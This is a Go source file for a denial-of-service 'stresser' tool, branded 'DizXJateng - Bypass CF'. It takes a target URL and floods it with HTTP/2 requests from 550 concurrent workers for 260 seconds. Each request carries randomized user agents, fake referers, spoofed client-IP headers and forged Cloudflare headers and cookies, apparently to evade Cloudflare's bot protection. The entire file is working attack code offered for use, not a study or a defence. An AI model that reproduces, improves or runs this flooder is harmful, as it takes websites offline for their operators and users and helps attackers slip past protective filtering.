package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/corpix/uarand"
	"golang.org/x/net/http2"
)

var (
	startTime    = time.Now()
	requests     int64
	successCount int64
	failedCount  int64
	concurrency  = 550
	referers     []string
	secHeaders   []string
	countries = []string{"US", "GB", "DE", "FR", "CA", "JP", "AU", "BR", "IN", "SG", "NL", "KR", "ID", "MY", "VN", "TH", "PH", "IT", "ES", "MX", "CN", "HK", "TW", "ZA", "NG", "NO", "SE", "CH", "AE", "SA", "IL", "TR", "NZ", "PT", "PL", "RU", "AR", "CO", "PE", "CL"}
	mu           sync.Mutex
)

const (
	Reset   = "\033[0m"
	Red     = "\033[31m"
	Green   = "\033[32m"
	Yellow  = "\033[33m"
	Cyan    = "\033[36m"
	Blue    = "\033[34m"
	Magenta = "\033[35m"
)

func init() {
	rand.Seed(time.Now().UnixNano())
	initReferers()
	initSecHeaders()
}

func initReferers() {
	referers = []string{
		"https://www.google.com/search?q=",
		"https://www.youtube.com/watch?v=",
		"https://www.facebook.com/",
		"https://twitter.com/home",
		"https://www.instagram.com/",
		"https://www.linkedin.com/feed/",
		"https://www.reddit.com/",
		"https://www.tiktok.com/",
		"https://www.amazon.com/",
		"https://www.netflix.com/",
		"https://www.microsoft.com/",
		"https://www.apple.com/",
		"https://openai.com/",
		"https://github.com/",
		"https://stackoverflow.com/",
		"https://news.ycombinator.com/",
		"https://www.washingtonpost.com/",
		"https://www.nytimes.com/",
		"https://www.bbc.com/",
		"https://www.cnn.com/",
		"https://www.alexa.com/topsites",
		"https://en.wikipedia.org/wiki/Special:Random",
		"https://www.imdb.com/",
		"https://www.ebay.com/",
		"https://www.walmart.com/",
		"https://www.twitch.tv/",
		"https://www.paypal.com/",
		"https://www.adobe.com/",
		"https://www.spotify.com/",
		"https://www.quora.com/",
		"https://www.pinterest.com/",
		"https://www.dropbox.com/",
		"https://www.etsy.com/",
		"https://www.flickr.com/",
		"https://www.slideshare.net/",
		"https://medium.com/",
		"https://change.org/",
		"https://ted.com/",
		"https://wikihow.com/",
		"https://healthline.com/",
		"https://businessinsider.com/",
		"https://forbes.com/",
		"https://bloomberg.com/",
		"https://techcrunch.com/",
		"https://mozilla.org/",
		"https://w3.org/",
		"https://nginx.org/",
		"https://apache.org/",
		"https://microsoftonline.com/",
		"https://office.com/",
		"https://drive.google.com/",
		"https://docs.google.com/",
		"https://mail.google.com/",
		"https://maps.google.com/",
		"https://play.google.com/",
		"https://photos.google.com/",
		"https://cloudflare.com/",
		"https://akamai.com/",
		"https://fastly.com/",
		"https://aws.amazon.com/",
		"https://azure.microsoft.com/",
		"https://cloud.google.com/",
		"https://digitalocean.com/",
		"https://oracle.com/",
		"https://ibm.com/",
		"https://intel.com/",
		"https://amd.com/",
		"https://nvidia.com/",
		"https://qualcomm.com/",
		"https://arm.com/",
		"https://docker.com/",
		"https://kubernetes.io/",
		"https://jenkins.io/",
		"https://gitlab.com/",
		"https://bitbucket.org/",
		"https://atlassian.com/",
		"https://slack.com/",
		"https://trello.com/",
		"https://asana.com/",
		"https://basecamp.com/",
		"https://notion.so/",
		"https://figma.com/",
		"https://adobe.com/creativecloud.html",
		"https://autodesk.com/",
		"https://unity.com/",
		"https://unrealengine.com/",
		"https://godotengine.org/",
		"https://blender.org/",
		"https://wikipedia.org/",
		"https://wikimedia.org/",
		"https://wiktionary.org/",
		"https://wikiquote.org/",
		"https://wikibooks.org/",
		"https://wikinews.org/",
		"https://wikisource.org/",
		"https://wikiversity.org/",
		"https://wikivoyage.org/",
		"https://wikidata.org/",
		"https://mediawiki.org/",
		"https://foundation.wikimedia.org/",
	}
}

func initSecHeaders() {
	secHeaders = []string{
		"Sec-CH-UA: \"Chromium\";v=\"121\", \"Not A;Brand\";v=\"99\"",
		"Sec-CH-UA-Mobile: ?0",
		"Sec-CH-UA-Platform: \"Windows\"",
		"Sec-CH-UA-Platform-Version: \"15.0.0\"",
		"Sec-CH-UA-Arch: \"x86\"",
		"Sec-CH-UA-Bitness: \"64\"",
		"Sec-CH-UA-Model: \"\"",
		"Sec-CH-UA-Full-Version-List: \"Chromium\";v=\"121.0.6167.160\", \"Not A;Brand\";v=\"99.0.0.0\"",
		"Sec-Fetch-Dest: document",
		"Sec-Fetch-Mode: navigate",
		"Sec-Fetch-Site: same-origin",
		"Sec-Fetch-User: ?1",
		"Sec-GPC: 1",
		"Priority: u=1, i",
		"Purpose: prefetch",
		"Service-Worker-Navigation-Preload: true",
		"CDN-Loop: cloudflare",
		"CF-Visitor: {\"scheme\":\"https\"}",
		"CF-Connecting-IP: 1.1.1.1",
		"True-Client-IP: 1.1.1.1",
		"X-Forwarded-Proto: https",
		"X-Forwarded-Port: 443",
		"X-Edge-Connect: mid",
		"X-Request-ID: " + GUUID(),
		"X-Correlation-ID: " + GUUID(),
		"X-Client-Data: " + GCD(),
		"X-Requested-With: XMLHttpRequest",
		"X-CSRF-Token: " + GT(),
		"X-API-Version: 3",
		"X-Content-Type-Options: nosniff",
		"X-DNS-Prefetch-Control: on",
		"X-Download-Options: noopen",
		"X-Frame-Options: SAMEORIGIN",
		"X-Permitted-Cross-Domain-Policies: none",
		"X-RateLimit-Limit: 100",
		"X-RateLimit-Remaining: 99",
		"X-RateLimit-Reset: " + fmt.Sprint(time.Now().Add(60*time.Second).Unix()),
		"X-XSS-Protection: 1; mode=block",
		"X-Debug-Info: debug=1",
		"X-Request-Start: t=" + fmt.Sprint(time.Now().UnixMicro()),
		"X-Client-Version: 3.2.1",
		"X-Device-Id: " + GUUID(),
		"X-Cloud-Trace-Context: " + GTID(),
		"X-Forwarded-TLSClient-Cert: " + GCH(),
		"X-Content-Duration: " + fmt.Sprint(rand.Intn(5000)),
		"X-Content-Security-Policy: default-src 'self'",
		"X-WebKit-CSP: default-src 'self'",
		"X-Forwarded-Server: edge-server",
		"X-Edge-Request-ID: " + GUUID(),
		"X-Origin-Request-ID: " + GUUID(),
		"X-Api-Key: " + GT(),
		"X-Request-Signature: " + GT(),
		"X-Cloudflare-Features: ssr",
		"X-Cloudflare-Client: enterprise",
		"X-Cloudflare-IP-Country: " + countries[rand.Intn(len(countries))],
		"X-Cloudflare-IP-ASN: AS" + fmt.Sprint(rand.Intn(100000)),
		"X-Cloudflare-IP-Organization: " + GON(),
		"X-Edge-IP: " + GRIP(),
		"X-Forwarded-Host: " + GFH(),
		"X-Original-URL: /" + GFP(),
	}
}

func GUUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func GT() string {
	b := make([]byte, 32)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func GCD() string {
	data := []string{
		"experiments=optimize_speed",
		"prefers_color_scheme=dark",
		"reduced_motion=true",
		"time_zone=Asia/Jakarta",
		"device_memory=" + fmt.Sprint(4+rand.Intn(12)),
		"hardware_concurrency=" + fmt.Sprint(2+rand.Intn(16)),
		"platform=win32",
		"bitness=64",
		"wow64=true",
		"accept_lang=en-US",
		"prefers_reduced_transparency=true",
		"prefers_reduced_data=true",
		"save_data=on",
	}
	return strings.Join(data, ";")
}

func GTID() string {
	return fmt.Sprintf("%x/%x", rand.Uint64(), rand.Uint32())
}

func GCH() string {
	b := make([]byte, 32)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func GON() string {
	orgs := []string{
		"Google LLC", "Amazon Inc", "Microsoft Corp", "Apple Inc", 
		"Cloudflare Inc", "Akamai Technologies", "DigitalOcean LLC",
		"Oracle Corporation", "IBM Corp", "Tencent Holdings",
	}
	return orgs[rand.Intn(len(orgs))]
}

func GFH() string {
	domains := []string{
		"cdn", "static", "assets", "images", "js", "css", 
		"api", "gateway", "edge", "origin", "lb", "cache",
	}
	return domains[rand.Intn(len(domains))] + ".example.com"
}

func GFP() string {
	paths := []string{
		"wp-admin", "wp-login", "api", "v2", "graphql", 
		"rest", "oauth", "auth", "login", "account",
	}
	return paths[rand.Intn(len(paths))] + "/" + GT()[:8]
}

func GRIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func GRR() string {
	base := referers[rand.Intn(len(referers))]
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 12+rand.Intn(20))
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return base + string(b)
}

func L() {
	fmt.Println(Red + `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
       ⠀    DizXJateng - Bypass CF 
` + Reset)
}

func GIPD(ip string) (isp, asn, country string) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	
	req, _ := http.NewRequestWithContext(ctx, "GET", "http://ip-api.com/json/"+ip, nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "Tidak Diketahui", "Tidak Ada", "Invisible"
	}
	defer resp.Body.Close()

	var data struct {
		Country string `json:"country"`
		Org     string `json:"org"`
		AS      string `json:"as"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return "Tidak Diketahui", "Tidak Ada", "Invisible"
	}
	return data.Org, data.AS, data.Country
}

func RH(host string) string {
	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return "Unknown"
	}
	return ips[0].String()
}

func GSH() []string {
	headersCopy := make([]string, len(secHeaders))
	copy(headersCopy, secHeaders)
	rand.Shuffle(len(headersCopy), func(i, j int) {
		headersCopy[i], headersCopy[j] = headersCopy[j], headersCopy[i]
	})
	return headersCopy[:20+rand.Intn(15)]
}

func CH2T() *http.Transport {
	return &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			},
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
				tls.CurveP384,
				tls.CurveP521,
			},
			NextProtos:         []string{"h2"},
			ClientSessionCache: tls.NewLRUClientSessionCache(1000),
		},
		DisableKeepAlives:   false,
		MaxIdleConns:        25000,
		MaxIdleConnsPerHost: 25000,
		MaxConnsPerHost:     0,
		IdleConnTimeout:     30 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
		ForceAttemptHTTP2:     true,
		TLSHandshakeTimeout:   3 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	}
}

func BAH(host string) http.Header {
	h := http.Header{}
	
	h.Set("User-Agent", uarand.GetRandom())
	h.Set("Referer", GRR())
	h.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
	h.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8,ms;q=0.7")
	h.Set("Accept-Encoding", "gzip, deflate, br, zstd")
	h.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	h.Set("Pragma", "no-cache")
	h.Set("Connection", "keep-alive")
	h.Set("DNT", fmt.Sprintf("%d", rand.Intn(2)))
	h.Set("Upgrade-Insecure-Requests", "1")
	h.Set("X-Forwarded-For", GRIP())
	h.Set("X-Requested-With", "XMLHttpRequest")
	h.Set("X-Real-IP", GRIP())
	h.Set("X-Client-Version", "3.2.1")
	h.Set("X-Device-Id", GUUID())
	h.Set("X-Request-Start", fmt.Sprintf("t=%d", time.Now().UnixMicro()))
	h.Set("X-Requested-Domain", host)
	h.Set("X-Content-Type", "application/json")
	h.Set("X-Requested-Protocol", "HTTP/2")
	h.Set("Te", "trailers")
	h.Set("Host", host)
	h.Set("Cookie", fmt.Sprintf("_cfuvid=%x; _ga=GA1.1.%d; _gid=GA1.1.%d; _gat=1; __cf_bm=%s", rand.Uint64(), rand.Uint64(), rand.Uint64(), GT()))
	h.Set("If-Modified-Since", time.Now().Add(-24*time.Hour).Format(time.RFC1123))
	h.Set("If-None-Match", fmt.Sprintf("\"%x\"", rand.Uint64()))
	h.Set("Origin", "https://"+host)
	h.Set("X-Forwarded-Host", host)
	h.Set("X-Host", host)
	h.Set("X-Forwarded-Path", "/")
	h.Set("X-Request-Identifier", GUUID())
	h.Set("CF-IPCountry", countries[rand.Intn(len(countries))])
	h.Set("CF-Connecting-IP", GRIP())
	h.Set("True-Client-IP", GRIP())
	h.Set("X-Forwarded-Proto", "https")
	h.Set("X-Forwarded-Port", "443")
	h.Set("X-Edge-Signature", GT())
	h.Set("X-Api-Fingerprint", GT())
	h.Set("X-Request-Session", GUUID())
	h.Set("X-Browser-Id", GUUID())
	h.Set("X-Session-Id", GUUID())
	h.Set("X-Trace-Id", GUUID())
	h.Set("X-Request-Time", fmt.Sprintf("%d", time.Now().Unix()))
	h.Set("X-Request-Charset", "UTF-8")
	h.Set("X-Requested-By", "XMLHttpRequest")
	h.Set("X-Cloudflare-Client", "enterprise")
	h.Set("X-Cloudflare-IP-Country", countries[rand.Intn(len(countries))])
	h.Set("X-Cloudflare-IP-ASN", fmt.Sprintf("AS%d", 100000+rand.Intn(900000)))
	h.Set("X-Cloudflare-IP-Organization", GON())
	
	for _, header := range GSH() {
		parts := strings.SplitN(header, ":", 2)
		if len(parts) == 2 {
			h.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}
	
	return h
}

func AW(target string, host string, wg *sync.WaitGroup, stopChan chan struct{}) {
	defer wg.Done()
	
	client := &http.Client{
		Transport: CH2T(),
		Timeout:   3 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for {
		select {
		case <-stopChan:
			return
		default:
			req, _ := http.NewRequest("GET", target, nil)
			req.Header = BAH(host)
			
			resp, err := client.Do(req)
			if err == nil {
				atomic.AddInt64(&requests, 1)
				if resp.StatusCode < 500 {
					atomic.AddInt64(&successCount, 1)
				} else {
					atomic.AddInt64(&failedCount, 1)
				}
				resp.Body.Close()
			} else {
				atomic.AddInt64(&failedCount, 1)
			}
		}
	}
}

func main() {
	L()
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(Reset + "╔═[ddos]Dizflyze Streser]\n╚═══➤ " + Reset)
	input, _ := reader.ReadString('\n')
	target := strings.TrimSpace(input)

	parsedURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("Tidak Di Kenali : ", err)
		return
	}

	host := parsedURL.Host
	HIP := RH(host)
	ISP, ASN, CHS := GIPD(HIP)

	duration := 260 * time.Second
	stopChan := make(chan struct{})
	var wg sync.WaitGroup

	transport := CH2T()
	http2.ConfigureTransport(transport)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go AW(target, host, &wg, stopChan)
	}

	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime)
				total := atomic.LoadInt64(&requests)
				success := atomic.LoadInt64(&successCount)
				RPS := float64(total) / elapsed.Seconds()
				
				fmt.Printf("\r%s%s%s REQ: %s%d%s | OK: %s%d%s | R: %s%.0f", 
						    Reset, time.Now().Format("04:05"), Reset,
 						   Yellow, total, Reset,
 						   Green, success, Reset,
						    Cyan, RPS)
			case <-stopChan:
				return
			}
		}
	}()

	go func() {
		time.Sleep(duration)
		close(stopChan)
	}()

	wg.Wait()

	elapsed := time.Since(startTime)
	TR := atomic.LoadInt64(&requests)
	SR := atomic.LoadInt64(&successCount)
	RPS := float64(TR) / elapsed.Seconds()

	L()
	fmt.Println(Red + "╔══════════════════════════════════════════════════════════╗" + Reset)
	fmt.Printf("%s│%s Target         : %s%s\n", Red, Reset, Yellow, target)
	fmt.Printf("%s│%s Host           : %s%s\n", Red, Reset, Yellow, host)
	fmt.Printf("%s│%s Host IP        : %s%s\n", Red, Reset, Yellow, HIP)
	fmt.Printf("%s│%s ISP            : %s%s\n", Red, Reset, Cyan, ISP)
	fmt.Printf("%s│%s ASN            : %s%s\n", Red, Reset, Cyan, ASN)
	fmt.Printf("%s│%s Country        : %s%s\n", Red, Reset, Cyan, CHS)
	fmt.Printf("%s│%s Duration       : %s\n", Red, Reset, elapsed.Round(time.Second))
	fmt.Printf("%s│%s Total Requests : %s%d\n", Red, Reset, Yellow, TR)
	fmt.Printf("%s│%s Success        : %s%d\n", Red, Reset, Green, SR)
	fmt.Printf("%s│%s RPS            : %s%.0f\n", Red, Reset, Cyan, RPS)
	fmt.Println(Red + "╚══════════════════════════════════════════════════════════╝" + Reset)
}
